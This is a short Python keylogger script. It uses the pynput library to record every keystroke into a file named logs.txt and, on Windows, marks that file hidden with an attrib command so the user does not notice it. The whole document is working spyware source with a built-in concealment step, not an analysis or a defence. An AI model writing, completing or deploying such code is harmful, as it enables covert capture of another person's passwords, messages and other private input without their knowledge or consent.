import pynput.keyboard
import threading
import os

log_file = "logs.txt"  # Hidden file to store keystrokes

def write_to_file(key):
    key = str(key).replace("'", "")  # Format the key output
    with open(log_file, "a") as f:
        f.write(key + " ")

def on_press(key):
    write_to_file(key)

# Start keylogger
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()

# Hide log file (Windows)
if os.name == "nt":
    os.system(f"attrib +h {log_file}")  # Hide file in Windows

print("Keylogger running... (Press Ctrl+C to stop manually)")
listener.join()
